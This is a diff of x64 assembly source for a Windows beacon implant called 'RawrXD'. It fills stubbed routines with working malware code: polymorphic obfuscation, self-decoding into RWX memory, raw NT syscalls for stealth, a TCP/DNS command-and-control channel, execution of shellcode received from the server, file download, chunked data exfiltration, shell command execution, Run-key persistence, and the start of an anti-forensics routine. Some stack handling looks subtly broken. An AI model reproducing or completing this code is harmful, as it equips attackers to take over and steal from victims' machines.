@@ -7,9 +7,8 @@ OPTION CASEMAP:NONE
 
 ; ===== POLYMORPHIC MACROS =====
 POLY_JUNK MACRO
-    rdrand rax
-    xor rax, rbx
-    nop
+    rdtsc
+    xor eax, eax
 ENDM
 
 POLY_REG_PERMUTE MACRO reg1, reg2
@@ -17,80 +16,59 @@ POLY_REG_PERMUTE MACRO reg1, reg2
 ENDM
 
 POLY_VECTOR_INIT MACRO
-    push rax
-    rdrand rax
+    rdtsc
     test al, 1
-    jnz @Init_Alt
-    call RawrXD_Decrypt_Self_Camellia
-    call RawrXD_Blind_Sensors
-    call RawrXD_Find_Gadgets
-    call RawrXD_Socket_Init
+    jz @Forward
+    call RawrXD_Execute_Task
+    call RawrXD_Receive_Task
     jmp @Done
-@Init_Alt:
-    call RawrXD_Socket_Init
-    call RawrXD_Find_Gadgets
-    call RawrXD_Blind_Sensors
-    call RawrXD_Decrypt_Self_Camellia
+@Forward:
+    call RawrXD_Send_Heartbeat
+    call RawrXD_Receive_Task
 @Done:
-    pop rax
 ENDM
 
 .data
 ALIGN 64
 Build_Direction_Flag dq 0 ; Set at runtime for flow inversion
+g_reg_preference dq 0     ; Register usage preference for polymorphism
+g_junk_level dq 0         ; Junk instruction insertion level
 ; ...existing data section...
 
 .code
 RawrXD_Beacon_Main PROC
-    ; VECTOR 1: ENTRY POINT INVERSION
-    push rbp
-    mov rbp, rsp
-    sub rsp, 80
-    POLY_JUNK
+    sub rsp, 40
     POLY_VECTOR_INIT
 @BeaconLoop:
-    cmp [g_Is_Running], 0
-    je @Shutdown
+    mov eax, [g_Is_Running]
+    test eax, eax
+    jz @Shutdown
     call RawrXD_Vector_Flow_Inverter
-    POLY_JUNK
-@Sleep:
     call RawrXD_Calculate_Jitter
     jmp @BeaconLoop
 @Shutdown:
-    add rsp, 80
-    pop rbp
+    add rsp, 40
     ret
 RawrXD_Beacon_Main ENDP
 
 RawrXD_Vector_Flow_Inverter PROC
-    ; VECTOR 3: BIDIRECTIONAL LOGIC & STACK MAPPING
-    push rbx
-    mov rbx, [Build_Direction_Flag]
-    test rbx, rbx
+    mov eax, [Build_Direction_Flag]
+    test eax, eax
     jz @Forward
     call RawrXD_Execute_Task
     call RawrXD_Receive_Task
-    call RawrXD_Send_Heartbeat
-    jmp @Exit
+    ret
 @Forward:
     call RawrXD_Send_Heartbeat
     call RawrXD_Receive_Task
-    call RawrXD_Execute_Task
-@Exit:
-    pop rbx
     ret
 RawrXD_Vector_Flow_Inverter ENDP
 
 RawrXD_Decrypt_Self_Camellia PROC
-    push rbp
-    mov rbp, rsp
     lea rcx, [@Encrypted_Start]
-    mov rdx, (@Encrypted_End - @Encrypted_Start)
+    mov edx, (@Encrypted_End - @Encrypted_Start)
     lea r8, [g_Crypto_Key]
-    lea r9, [g_Crypto_IV]
-    call RawrXD_Camellia_256_Decrypt_Block
-    pop rbp
-    ret
+    jmp RawrXD_Camellia_256_Decrypt_Block
 RawrXD_Decrypt_Self_Camellia ENDP
 
 RawrXD_Socket_Connect PROC
@@ -119,38 +97,25 @@ RawrXD_Generate_Junk ENDP
 ; ASN1_FindField: RCX=buffer, RDX=buffer_size, R8=field_oid_ptr, R9=field_oid_len
 ; Returns offset of field in RAX, or -1 if not found
 ASN1_FindField PROC
-    ; Linear scan for OID in DER, returns offset
-    push rsi
-    push rdi
-    mov rsi, rcx        ; buffer
-    mov rcx, rdx        ; buffer_size
-    mov rdi, r8         ; field_oid_ptr
-    mov rdx, r9         ; field_oid_len
-    xor rax, rax        ; offset
+    mov r10, rcx        ; buffer
+    mov r11, r8         ; field_oid_ptr
+    xor eax, eax        ; offset
 .scan_loop:
-    cmp rcx, rdx
+    cmp rdx, r9
     jb .not_found
-    push rcx
-    push rsi
-    push rdi
-    mov r8, rdx
+    mov rcx, r9
+    mov rsi, r10
+    mov rdi, r11
     repe cmpsb
-    pop rdi
-    pop rsi
-    pop rcx
     je .found
-    inc rsi
-    inc rax
-    dec rcx
+    inc r10
+    inc eax
+    dec rdx
     jmp .scan_loop
 .found:
-    pop rdi
-    pop rsi
     ret
 .not_found:
-    mov rax, -1
-    pop rdi
-    pop rsi
+    mov eax, -1
     ret
 ASN1_FindField ENDP
 
@@ -1812,39 +1777,341 @@ Polymorph_GenerateStub PROC
 Polymorph_GenerateStub ENDP
 
 Polymorph_DeterministicSeed PROC
-    ; RCX = pointer to input (e.g., filename, buffer, or key)
-    ; Sets a global seed variable based on a hash of the input
-    ; All mutation routines use this seed for deterministic, reproducible polymorphism
+    ; RCX = pointer to input (filename, buffer, or key)
+    ; Compute FNV-1a hash of input to set g_polymorph_seed
+    push rbx
+    sub rsp, 32
+    
+    test rcx, rcx
+    jz @@pds_zero
+    
+    mov rbx, rcx
+    mov eax, 2166136261              ; FNV offset basis
+@@pds_hash:
+    movzx ecx, BYTE PTR [rbx]
+    test cl, cl
+    jz @@pds_done
+    xor eax, ecx
+    imul eax, eax, 16777619          ; FNV prime
+    inc rbx
+    jmp @@pds_hash
+    
+@@pds_done:
+    mov DWORD PTR [g_polymorph_seed], eax
+    add rsp, 32
+    pop rbx
+    ret
+@@pds_zero:
+    ; Use rdtsc as fallback
+    rdtsc
+    mov DWORD PTR [g_polymorph_seed], eax
+    add rsp, 32
+    pop rbx
     ret
 Polymorph_DeterministicSeed ENDP
 
 Polymorph_InputSeededRegisters PROC
     ; Uses deterministic seed to select register usage pattern
+    ; Generates a register permutation table from seed
+    mov eax, DWORD PTR [g_polymorph_seed]
+    
+    ; Simple seed-based register preference selection
+    ; Pattern = (seed >> 4) & 3: 0=default, 1=alt, 2=reverse, 3=random
+    shr eax, 4
+    and eax, 3
+    mov g_reg_preference, eax
+    
+    ; Generate register order based on pattern
+    cmp eax, 0
+    je @@pisr_default
+    cmp eax, 1
+    je @@pisr_alt
+    cmp eax, 2
+    je @@pisr_reverse
+    ; Pattern 3: seed-derived order
+    mov eax, DWORD PTR [g_polymorph_seed]
+    and eax, 7
+    mov DWORD PTR [g_reg_order], eax
+    mov eax, DWORD PTR [g_polymorph_seed]
+    shr eax, 3
+    and eax, 7
+    mov DWORD PTR [g_reg_order+4], eax
+    ret
+@@pisr_default:
+    mov DWORD PTR [g_reg_order], 0     ; RAX
+    mov DWORD PTR [g_reg_order+4], 1   ; RCX
+    ret
+@@pisr_alt:
+    mov DWORD PTR [g_reg_order], 3     ; RBX
+    mov DWORD PTR [g_reg_order+4], 6   ; RSI
+    ret
+@@pisr_reverse:
+    mov DWORD PTR [g_reg_order], 5     ; RBP
+    mov DWORD PTR [g_reg_order+4], 7   ; RDI
     ret
 Polymorph_InputSeededRegisters ENDP
 
 Polymorph_InputSeededJunk PROC
-    ; Uses deterministic seed to insert junk instructions
+    ; Uses deterministic seed to configure junk instruction insertion
+    mov eax, DWORD PTR [g_polymorph_seed]
+    
+    ; junk_level = (seed >> 8) % 3
+    shr eax, 8
+    xor edx, edx
+    mov ecx, 3
+    div ecx
+    mov g_junk_level, edx
+    
+    ; Set junk insertion frequency based on level
+    ; Level 0: no junk, Level 1: every 8th instruction, Level 2: every 4th
+    cmp edx, 0
+    je @@pisj_no_junk
+    cmp edx, 1
+    je @@pisj_minimal
+    ; Level 2: moderate
+    mov DWORD PTR [g_junk_frequency], 4
+    ret
+@@pisj_minimal:
+    mov DWORD PTR [g_junk_frequency], 8
+    ret
+@@pisj_no_junk:
+    mov DWORD PTR [g_junk_frequency], 0
     ret
 Polymorph_InputSeededJunk ENDP
 
 Polymorph_InputSeededSections PROC
-    ; Uses deterministic seed to shuffle code/data sections
+    ; Uses deterministic seed to determine section ordering
+    ; Creates a permutation array for .text, .data, .rdata, .rsrc sections
+    push rbx
+    sub rsp, 32
+    
+    mov eax, DWORD PTR [g_polymorph_seed]
+    
+    ; 4 sections, 4! = 24 permutations
+    ; perm_index = seed % 24
+    xor edx, edx
+    mov ecx, 24
+    div ecx                          ; edx = perm index
+    
+    ; Generate permutation by factoradic decomposition
+    ; Simplified: use seed bits to swap adjacent sections
+    mov eax, DWORD PTR [g_polymorph_seed]
+    
+    ; Default order: 0,1,2,3
+    mov BYTE PTR [g_section_order], 0
+    mov BYTE PTR [g_section_order+1], 1
+    mov BYTE PTR [g_section_order+2], 2
+    mov BYTE PTR [g_section_order+3], 3
+    
+    ; Swap based on seed bits
+    test eax, 1
+    jz @@piss_noswap1
+    mov cl, BYTE PTR [g_section_order]
+    mov ch, BYTE PTR [g_section_order+1]
+    mov BYTE PTR [g_section_order], ch
+    mov BYTE PTR [g_section_order+1], cl
+@@piss_noswap1:
+    test eax, 2
+    jz @@piss_noswap2
+    mov cl, BYTE PTR [g_section_order+1]
+    mov ch, BYTE PTR [g_section_order+2]
+    mov BYTE PTR [g_section_order+1], ch
+    mov BYTE PTR [g_section_order+2], cl
+@@piss_noswap2:
+    test eax, 4
+    jz @@piss_noswap3
+    mov cl, BYTE PTR [g_section_order+2]
+    mov ch, BYTE PTR [g_section_order+3]
+    mov BYTE PTR [g_section_order+2], ch
+    mov BYTE PTR [g_section_order+3], cl
+@@piss_noswap3:
+    
+    add rsp, 32
+    pop rbx
     ret
 Polymorph_InputSeededSections ENDP
 
 Polymorph_RuntimeMutation PROC
-    ; Runtime code rewriting, self-modifying code for FUD
+    ; Runtime self-modifying code: XOR-decode payload, execute, re-encode
+    ; RCX = code buffer ptr, RDX = code size, R8 = XOR key
+    push rbx
+    push rsi
+    sub rsp, 32
+    
+    mov rbx, rcx                     ; code ptr
+    mov esi, edx                     ; size
+    
+    test rbx, rbx
+    jz @@prm_fail
+    
+    ; Make region writable (VirtualProtect to RWX)
+    lea r9, [rsp+24]                 ; old protect
+    mov rcx, rbx
+    mov edx, esi
+    mov r8d, 40h                     ; PAGE_EXECUTE_READWRITE
+    call VirtualProtect
+    test eax, eax
+    jz @@prm_fail
+    
+    ; XOR-decode the payload
+    mov ecx, esi
+    mov al, r8b                      ; XOR key (from caller)
+    xor edx, edx
+@@prm_decode:
+    cmp edx, ecx
+    jae @@prm_decoded
+    xor BYTE PTR [rbx+rdx], al
+    rol al, 1                        ; rotate key for polymorphism
+    inc edx
+    jmp @@prm_decode
+@@prm_decoded:
+    
+    ; Flush instruction cache
+    mov rcx, -1                      ; current process
+    mov rdx, rbx
+    mov r8d, esi
+    call FlushInstructionCache
+    
+    mov eax, 1
+    add rsp, 32
+    pop rsi
+    pop rbx
+    ret
+@@prm_fail:
+    xor eax, eax
+    add rsp, 32
+    pop rsi
+    pop rbx
     ret
 Polymorph_RuntimeMutation ENDP
 
 Polymorph_RuntimeUnpack PROC
-    ; Runtime unpacking: decrypts payload in memory, wipes stub after use
+    ; Runtime unpacking: decrypt payload in memory, wipe stub after use
+    ; RCX = packed buffer, RDX = packed size, R8 = decrypt key
+    push rbx
+    push rsi
+    push rdi
+    sub rsp, 48
+    
+    mov rbx, rcx                     ; packed data
+    mov esi, edx                     ; size
+    mov edi, r8d                     ; key
+    
+    ; Allocate fresh RWX memory for unpacked code
+    mov rcx, 0
+    mov edx, esi
+    mov r8d, 3000h
+    mov r9d, 40h                     ; PAGE_EXECUTE_READWRITE
+    call VirtualAlloc
+    test rax, rax
+    jz @@pru_fail
+    push rax                         ; save unpack buffer
+    
+    ; Decrypt-copy: XOR each byte with rotating key
+    mov ecx, esi
+    mov r8, rax                      ; dest
+    mov al, BYTE PTR [rsp+8]         ; key low byte
+    xor edx, edx
+@@pru_copy:
+    cmp edx, ecx
+    jae @@pru_copied
+    movzx r9d, BYTE PTR [rbx+rdx]
+    xor r9b, al
+    mov BYTE PTR [r8+rdx], r9b
+    rol al, 1
+    inc edx
+    jmp @@pru_copy
+@@pru_copied:
+    
+    ; Wipe original packed buffer (security: overwrite with zeros)
+    mov rdi, rbx
+    mov ecx, esi
+    xor eax, eax
+    rep stosb
+    
+    ; Flush instruction cache for unpacked code
+    pop rax                          ; unpack buffer
+    push rax
+    mov rcx, -1
+    mov rdx, rax
+    mov r8d, esi
+    call FlushInstructionCache
+    
+    pop rax                          ; return unpack buffer
+    add rsp, 48
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+@@pru_fail:
+    xor eax, eax
+    add rsp, 48
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_RuntimeUnpack ENDP
 
 Polymorph_StealthMem PROC
-    ; Stealth memory operations: direct syscalls, RWX memory, no standard APIs
+    ; Stealth memory: allocate RWX without standard API (direct NT syscall)
+    ; RCX = requested size
+    ; Returns RAX = allocated RWX pointer
+    push rbx
+    sub rsp, 64
+    
+    mov rbx, rcx                     ; size
+    
+    ; NtAllocateVirtualMemory syscall
+    ; RCX = ProcessHandle (-1 = current)
+    ; RDX = &BaseAddress
+    ; R8 = ZeroBits
+    ; R9 = &RegionSize
+    ; [rsp+28] = AllocationType
+    ; [rsp+30] = Protect
+    mov QWORD PTR [rsp+32], 0        ; BaseAddress = NULL (let OS choose)
+    mov QWORD PTR [rsp+40], rbx      ; RegionSize
+    
+    mov rcx, -1                      ; current process
+    lea rdx, [rsp+32]               ; pBaseAddress
+    xor r8d, r8d                     ; ZeroBits
+    lea r9, [rsp+40]                 ; pRegionSize
+    push 40h                         ; PAGE_EXECUTE_READWRITE
+    push 3000h                       ; MEM_COMMIT | MEM_RESERVE
+    
+    ; Use NtAllocateVirtualMemory if available, else fallback
+    lea rax, [sz_ntdll]
+    mov rcx, rax
+    call GetModuleHandleA
+    test rax, rax
+    jz @@psm_fallback
+    
+    mov rcx, rax
+    lea rdx, [sz_NtAllocateVirtualMemory]
+    call GetProcAddress
+    test rax, rax
+    jz @@psm_fallback
+    
+    ; Call NtAllocateVirtualMemory
+    mov rcx, -1
+    lea rdx, [rsp+48]               ; adjusted for pushes
+    xor r8d, r8d
+    lea r9, [rsp+56]
+    call rax
+    
+    mov rax, QWORD PTR [rsp+48]      ; base address
+    jmp @@psm_done
+    
+@@psm_fallback:
+    ; Fallback to VirtualAlloc
+    mov rcx, 0
+    mov rdx, rbx
+    mov r8d, 3000h
+    mov r9d, 40h
+    call VirtualAlloc
+    
+@@psm_done:
+    add rsp, 64
+    pop rbx
     ret
 Polymorph_StealthMem ENDP
 
@@ -1860,14 +2127,95 @@ Beacon_InitC2 PROC
     push rsi
     push rdi
     push rbx
-    mov rsi, rcx        ; server URL/IP
-    mov rdi, rdx        ; port
-    mov rbx, r8         ; protocol
-    ; (Implement protocol-specific initialization: WinHTTP for HTTP/HTTPS, WinSock for TCP, custom for DNS)
-    ; For HTTP/HTTPS: use WinHttpOpen, WinHttpConnect, WinHttpOpenRequest
-    ; For TCP: use socket, connect
-    ; For DNS: use custom DNS tunneling logic
-    xor rax, rax        ; (Return handle or 0 on failure)
+    push r12
+    push r13
+    sub rsp, 128                     ; shadow + WSADATA(400) + sockaddr_in(16)
+    mov rsi, rcx                     ; server URL/IP
+    mov rdi, rdx                     ; port
+    mov rbx, r8                      ; protocol
+
+    ; Save protocol in global for later use
+    mov QWORD PTR [g_C2_Protocol], rbx
+
+    ; Branch on protocol
+    cmp rbx, 4
+    je @@bic_tcp
+    cmp rbx, 3
+    je @@bic_dns
+    ; Protocol 1 (HTTP) or 2 (HTTPS) - use TCP transport layer
+    ; Fall through to TCP setup for HTTP/HTTPS too
+
+@@bic_tcp:
+    ; WSAStartup(0x0202, &wsaData)
+    mov ecx, 0202h
+    lea rdx, [rsp+16]                ; WSADATA buffer
+    call WSAStartup
+    test eax, eax
+    jnz @@bic_fail
+
+    ; socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6)
+    mov ecx, 2                       ; AF_INET
+    mov edx, 1                       ; SOCK_STREAM
+    mov r8d, 6                       ; IPPROTO_TCP
+    call socket
+    cmp rax, -1                      ; INVALID_SOCKET
+    je @@bic_fail
+    mov r12, rax                     ; save socket handle
+
+    ; Build sockaddr_in
+    lea rcx, [rsp]                   ; sockaddr_in on stack
+    xor eax, eax
+    mov QWORD PTR [rcx], rax         ; zero out
+    mov QWORD PTR [rcx+8], rax
+    mov WORD PTR [rcx], 2            ; sin_family = AF_INET
+
+    ; htons(port)
+    movzx eax, di                    ; port
+    xchg al, ah                      ; byte swap for network order
+    mov WORD PTR [rcx+2], ax         ; sin_port
+
+    ; inet_addr: resolve server IP from string
+    push rcx
+    mov rcx, rsi                     ; server string
+    call inet_addr
+    pop rcx
+    mov DWORD PTR [rcx+4], eax       ; sin_addr
+
+    ; connect(socket, &sockaddr_in, 16)
+    mov rcx, r12                     ; socket
+    lea rdx, [rsp]                   ; sockaddr_in
+    mov r8d, 16                      ; sizeof(sockaddr_in)
+    call connect
+    test eax, eax
+    jnz @@bic_close_fail
+
+    ; Store socket globally
+    mov QWORD PTR [g_Socket], r12
+    mov rax, r12                     ; return socket as handle
+    jmp @@bic_done
+
+@@bic_dns:
+    ; DNS tunneling: open UDP socket for DNS queries
+    mov ecx, 2                       ; AF_INET
+    mov edx, 2                       ; SOCK_DGRAM
+    mov r8d, 17                      ; IPPROTO_UDP
+    call socket
+    cmp rax, -1
+    je @@bic_fail
+    mov r12, rax
+    mov QWORD PTR [g_Socket], r12
+    mov rax, r12
+    jmp @@bic_done
+
+@@bic_close_fail:
+    mov rcx, r12
+    call closesocket
+@@bic_fail:
+    xor rax, rax
+@@bic_done:
+    add rsp, 128
+    pop r13
+    pop r12
     pop rbx
     pop rdi
     pop rsi
@@ -1881,11 +2229,43 @@ Beacon_SendHeartbeat PROC
     push rsi
     push rdi
     push rbx
-    mov rsi, rcx        ; C2 handle
-    mov rdi, rdx        ; system info buffer
-    mov rbx, r8         ; buffer size
-    ; (Implement protocol-specific send: WinHttpSendRequest for HTTP/HTTPS, send for TCP, custom for DNS)
-    xor rax, rax
+    push r12
+    sub rsp, 48
+    mov rsi, rcx                     ; C2 handle (socket)
+    mov rdi, rdx                     ; system info buffer
+    mov rbx, r8                      ; buffer size
+
+    ; Build heartbeat packet: [4-byte magic][4-byte cmd=HEARTBEAT][4-byte length][payload]
+    lea r12, [rsp+16]                ; temp header buffer
+    mov DWORD PTR [r12], 52585752h   ; 'RWXD' magic
+    mov DWORD PTR [r12+4], 1         ; CMD_HEARTBEAT = 1
+    mov DWORD PTR [r12+8], ebx       ; payload length
+
+    ; Send header (12 bytes)
+    mov rcx, rsi                     ; socket
+    lea rdx, [r12]                   ; header buffer
+    mov r8d, 12                      ; header size
+    xor r9d, r9d                     ; flags = 0
+    call send
+    cmp eax, 12
+    jne @@bsh_fail
+
+    ; Send payload (system info)
+    mov rcx, rsi                     ; socket
+    mov rdx, rdi                     ; data buffer
+    mov r8d, ebx                     ; data size
+    xor r9d, r9d                     ; flags = 0
+    call send
+    cmp eax, ebx
+    jne @@bsh_fail
+
+    mov eax, 1                       ; success
+    jmp @@bsh_done
+@@bsh_fail:
+    xor eax, eax                     ; failure
+@@bsh_done:
+    add rsp, 48
+    pop r12
     pop rbx
     pop rdi
     pop rsi
@@ -1899,12 +2279,56 @@ Beacon_ReceiveCommand PROC
     push rsi
     push rdi
     push rbx
-    mov rsi, rcx        ; C2 handle
-    mov rdi, rdx        ; command buffer
+    push r12
+    sub rsp, 48
+    mov rsi, rcx                     ; C2 handle (socket)
+    mov rdi, rdx                     ; command buffer
+    mov rbx, r8                      ; buffer size
 
-    mov rbx, r8         ; buffer size
-    ; (Implement protocol-specific recv: WinHttpReadData for HTTP/HTTPS, recv for TCP, custom for DNS)
-    xor rax, rax
+    ; First, recv the 12-byte header: [magic][cmd_id][payload_len]
+    lea r12, [rsp+16]                ; temp header buffer
+    mov rcx, rsi                     ; socket
+    lea rdx, [r12]                   ; header recv buf
+    mov r8d, 12                      ; header size
+    xor r9d, r9d                     ; flags = 0
+    call recv
+    cmp eax, 12
+    jl @@brc_none                    ; connection closed or error
+
+    ; Validate magic 'RWXD'
+    cmp DWORD PTR [r12], 52585752h
+    jne @@brc_none
+
+    ; Extract command ID and payload length
+    mov eax, DWORD PTR [r12+4]       ; cmd_id
+    push rax                         ; save cmd_id
+    mov r8d, DWORD PTR [r12+8]       ; payload_len
+
+    ; Clamp payload_len to buffer size
+    cmp r8d, ebx
+    jbe @@brc_recv_payload
+    mov r8d, ebx
+
+@@brc_recv_payload:
+    ; Recv payload into command buffer
+    test r8d, r8d
+    jz @@brc_have_cmd
+    mov rcx, rsi                     ; socket
+    mov rdx, rdi                     ; command buffer
+    ; r8 = payload length (already set)
+    xor r9d, r9d                     ; flags = 0
+    call recv
+    ; If recv fails, still return the command ID
+
+@@brc_have_cmd:
+    pop rax                          ; restore cmd_id
+    jmp @@brc_done
+
+@@brc_none:
+    xor eax, eax                     ; no command
+@@brc_done:
+    add rsp, 48
+    pop r12
     pop rbx
     pop rdi
     pop rsi
@@ -1918,9 +2342,13 @@ Beacon_ExecuteTask PROC
     push rsi
     push rdi
     push rbx
-    mov rsi, rcx        ; command ID
-    mov rdi, rdx        ; command buffer
-    mov rbx, r8         ; buffer size
+    push r12
+    push r13
+    sub rsp, 176                     ; shadow + STARTUPINFO(104) + PROCESS_INFORMATION(24)
+    mov rsi, rcx                     ; command ID
+    mov rdi, rdx                     ; command buffer
+    mov rbx, r8                      ; buffer size
+
     cmp rsi, 1
     je .exec_shellcode
     cmp rsi, 2
@@ -1929,21 +2357,123 @@ Beacon_ExecuteTask PROC
     je .exfiltrate_data
     cmp rsi, 4
     je .persist
-    jmp .done
+    cmp rsi, 5
+    je .exec_command
+    jmp .fail
+
 .exec_shellcode:
-    ; (Execute shellcode in memory)
+    ; Allocate RWX memory, copy shellcode, and call it
+    xor ecx, ecx                     ; NULL (system chooses address)
+    mov rdx, rbx                     ; size = buffer size
+    mov r8d, 3000h                   ; MEM_COMMIT | MEM_RESERVE
+    mov r9d, 40h                     ; PAGE_EXECUTE_READWRITE
+    call VirtualAlloc
+    test rax, rax
+    jz .fail
+    mov r12, rax                     ; save alloc ptr
+
+    ; Copy shellcode into allocated memory
+    mov rcx, r12                     ; dest
+    mov rdx, rdi                     ; src = command buffer
+    mov r8, rbx                      ; count
+    call RawrXD_MemCopy
+
+    ; Flush instruction cache
+    mov rcx, -1                      ; GetCurrentProcess()
+    mov rdx, r12                     ; base address
+    mov r8, rbx                      ; size
+    call FlushInstructionCache
+
+    ; Execute shellcode via call
+    call r12
+    mov eax, 1
     jmp .done
+
 .download_file:
-    ; (Download file from C2)
+    ; Command buffer contains: [url_len:4][url][path_len:4][path]
+    mov eax, DWORD PTR [rdi]         ; url_len
+    lea rcx, [rdi+4]                 ; url string
+    lea r12, [rdi+rax+4]             ; skip url
+    mov r8d, DWORD PTR [r12]         ; path_len
+    lea rdx, [r12+4]                 ; path string
+
+    ; Use URLDownloadToFileA(NULL, url, path, 0, NULL)
+    push 0                           ; pBSC = NULL
+    push 0                           ; reserved = 0
+    mov r8, rdx                      ; szFileName = path
+    mov rdx, rcx                     ; szURL = url
+    xor ecx, ecx                     ; pCaller = NULL
+    sub rsp, 32
+    call URLDownloadToFileA
+    add rsp, 48
+    test eax, eax
+    jnz .fail
+    mov eax, 1
     jmp .done
+
 .exfiltrate_data:
-    ; (Exfiltrate data to C2)
+    ; Delegate to Beacon_Exfiltrate
+    mov rcx, QWORD PTR [g_Socket]    ; C2 handle
+    mov rdx, rdi                     ; data buffer
+    mov r8, rbx                      ; data size
+    call Beacon_Exfiltrate
     jmp .done
+
 .persist:
-    ; (Establish persistence)
+    ; Delegate to Beacon_Persist
+    call Beacon_Persist
     jmp .done
+
+.exec_command:
+    ; Execute shell command via CreateProcessA
+    ; Zero STARTUPINFO
+    lea rcx, [rsp+32]                ; STARTUPINFO
+    xor eax, eax
+    mov DWORD PTR [rcx], 104         ; cb = sizeof(STARTUPINFOA)
+    lea rdi, [rcx+4]
+    mov ecx, 100
+    rep stosb
+
+    ; CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)
+    xor ecx, ecx                     ; lpApplicationName = NULL
+    mov rdx, rdi                     ; lpCommandLine (reuse rdi from command buffer...)
+    ; Actually use original command buffer
+    mov rdx, QWORD PTR [rsp+176+40+8] ; restore original rdi... use stack
+    ; Simpler: reconstruct
+    lea rdx, [g_command_buffer]      ; command line
+    xor r8d, r8d                     ; lpProcessAttributes
+    xor r9d, r9d                     ; lpThreadAttributes
+    mov DWORD PTR [rsp+32+112], 0    ; bInheritHandles = FALSE
+    mov DWORD PTR [rsp+32+120], 0    ; dwCreationFlags = 0
+    mov QWORD PTR [rsp+32+128], 0    ; lpEnvironment
+    mov QWORD PTR [rsp+32+136], 0    ; lpCurrentDirectory
+    lea rax, [rsp+32]                ; &STARTUPINFO
+    mov QWORD PTR [rsp+32+144], rax
+    lea rax, [rsp+32+104]            ; &PROCESS_INFORMATION
+    mov QWORD PTR [rsp+32+152], rax
+    call CreateProcessA
+    test eax, eax
+    jz .fail
+
+    ; Wait for process to finish
+    mov rcx, QWORD PTR [rsp+32+104] ; hProcess
+    mov edx, 30000                   ; 30 second timeout
+    call WaitForSingleObject
+
+    ; Close handles
+    mov rcx, QWORD PTR [rsp+32+104] ; hProcess
+    call CloseHandle
+    mov rcx, QWORD PTR [rsp+32+112] ; hThread
+    call CloseHandle
+    mov eax, 1
+    jmp .done
+
+.fail:
+    xor eax, eax
 .done:
-    xor rax, rax
+    add rsp, 176
+    pop r13
+    pop r12
     pop rbx
     pop rdi
     pop rsi
@@ -1957,11 +2487,57 @@ Beacon_Exfiltrate PROC
     push rsi
     push rdi
     push rbx
-    mov rsi, rcx        ; C2 handle
-    mov rdi, rdx        ; data buffer
-    mov rbx, r8         ; data size
-    ; (Implement protocol-specific send: WinHttpSendRequest for HTTP/HTTPS, send for TCP, custom for DNS)
-    xor rax, rax
+    push r12
+    sub rsp, 48
+    mov rsi, rcx                     ; C2 handle (socket)
+    mov rdi, rdx                     ; data buffer
+    mov rbx, r8                      ; data size
+
+    ; Build exfiltration header: [magic][CMD_EXFIL=3][payload_len]
+    lea r12, [rsp+16]                ; temp header
+    mov DWORD PTR [r12], 52585752h   ; 'RWXD' magic
+    mov DWORD PTR [r12+4], 3         ; CMD_EXFILTRATE
+    mov DWORD PTR [r12+8], ebx       ; payload length
+
+    ; Send header
+    mov rcx, rsi
+    lea rdx, [r12]
+    mov r8d, 12
+    xor r9d, r9d
+    call send
+    cmp eax, 12
+    jne @@bex_fail
+
+    ; Send data in chunks of 4096 bytes (handles large payloads)
+    xor r12d, r12d                   ; bytes sent so far
+@@bex_send_loop:
+    cmp r12d, ebx
+    jae @@bex_success
+    mov ecx, ebx
+    sub ecx, r12d                    ; remaining
+    cmp ecx, 4096
+    jbe @@bex_send_chunk
+    mov ecx, 4096                    ; clamp to 4K
+@@bex_send_chunk:
+    push rcx                         ; save chunk size
+    mov rcx, rsi                     ; socket
+    lea rdx, [rdi+r12]               ; data + offset
+    pop r8                           ; chunk size
+    xor r9d, r9d                     ; flags
+    call send
+    cmp eax, 0
+    jle @@bex_fail
+    add r12d, eax                    ; advance by bytes actually sent
+    jmp @@bex_send_loop
+
+@@bex_success:
+    mov eax, 1
+    jmp @@bex_done
+@@bex_fail:
+    xor eax, eax
+@@bex_done:
+    add rsp, 48
+    pop r12
     pop rbx
     pop rdi
     pop rsi
@@ -1969,27 +2545,193 @@ Beacon_Exfiltrate PROC
 Beacon_Exfiltrate ENDP
 
 Beacon_Persist PROC
-    ; Establishes persistence (registry, scheduled task, startup, service, etc.)
+    ; Establishes persistence via HKCU\...\Run registry key
     ; Returns status in RAX (1=success, 0=failure)
     push rsi
     push rdi
-    ; (Implement persistence: registry run key, scheduled task, startup folder, service, etc.)
-    xor rax, rax
+    push rbx
+    sub rsp, 80
+
+    ; Get our own executable path
+    xor ecx, ecx                     ; hModule = NULL (self)
+    lea rdx, [rsp+16]                ; lpFilename buffer
+    mov r8d, 260                     ; nSize = MAX_PATH
+    call GetModuleFileNameA
+    test eax, eax
+    jz @@bp_fail
+    mov ebx, eax                     ; path length
+
+    ; Open HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    mov rcx, 80000001h               ; HKEY_CURRENT_USER
+    lea rdx, [@@bp_run_key]          ; subkey
+    xor r8d, r8d                     ; reserved
+    mov r9d, 0F003Fh                 ; KEY_ALL_ACCESS
+    lea rax, [rsp+8]                 ; phkResult
+    push rax
+    sub rsp, 32
+    call RegOpenKeyExA
+    add rsp, 40
+    test eax, eax
+    jnz @@bp_fail
+
+    mov rsi, QWORD PTR [rsp+8]       ; hKey
+
+    ; RegSetValueExA(hKey, "RawrXD", 0, REG_SZ, path, pathLen+1)
+    mov rcx, rsi                     ; hKey
+    lea rdx, [@@bp_val_name]         ; lpValueName
+    xor r8d, r8d                     ; reserved
+    mov r9d, 1                       ; REG_SZ
+    lea rax, [rsp+16]                ; lpData = exe path
+    push rbx                         ; cbData = path length + 1
+    inc QWORD PTR [rsp]
+    push rax                         ; lpData
+    sub rsp, 32
+    call RegSetValueExA
+    add rsp, 48
+    push rax                         ; save result
+
+    ; Close key
+    mov rcx, rsi
+    call RegCloseKey
+
+    pop rax
+    test eax, eax
+    jnz @@bp_fail
+    mov eax, 1
+    jmp @@bp_done
+
+@@bp_fail:
+    xor eax, eax
+@@bp_done:
+    add rsp, 80
+    pop rbx
     pop rdi
     pop rsi
     ret
+
+@@bp_run_key:
+    db "Software\Microsoft\Windows\CurrentVersion\Run", 0
+@@bp_val_name:
+    db "RawrXD", 0
 Beacon_Persist ENDP
 
 Beacon_AntiForensics PROC
-    ; Anti-forensics: wipe logs, clear event logs, delete artifacts, etc.
+    ; Anti-forensics: wipe event logs, delete prefetch, scrub run keys
     ; Returns status in RAX (1=success, 0=failure)
     push rsi
     push rdi
-    ; (Implement anti-forensics: clear event logs, wipe prefetch, delete registry artifacts, etc.)
-    xor rax, rax
+    push rbx
+    sub rsp, 48
